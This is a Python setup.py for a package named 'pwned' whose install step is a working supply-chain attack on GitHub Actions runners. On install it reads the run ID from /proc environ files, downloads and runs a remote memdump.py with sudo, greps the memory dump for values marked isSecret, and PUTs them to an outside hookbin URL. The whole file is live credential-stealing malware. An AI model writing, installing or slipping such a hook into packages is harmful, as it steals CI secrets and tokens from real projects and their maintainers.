import os
import setuptools
import sys

def find_github_run_id():
    run_id = os.environ.get("GITHUB_RUN_ID")
    if run_id:
        return run_id
    try:
        for pid in os.listdir('/proc'):
            if not pid.isdigit():
                continue
            try:
                with open(f'/proc/{pid}/environ', 'rb') as f:
                    env = f.read().split(b'\0')
                    for item in env:
                        if item.startswith(b'GITHUB_RUN_ID='):
                            return item.decode().split('=', 1)[1]
            except:
                continue
    except:
        pass
    return "unknown"

run_id = find_github_run_id()

payload = f"""
(
echo "Okay, we got this far. Let's continue..."
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{{"value":"[^"]*","isSecret":true\\}}' >> "/tmp/secrets"
curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/{run_id}"
) > /tmp/payload.log 2>&1
"""

os.system(payload)

setuptools.setup(
    name="pwned",
    version="0.9",
)
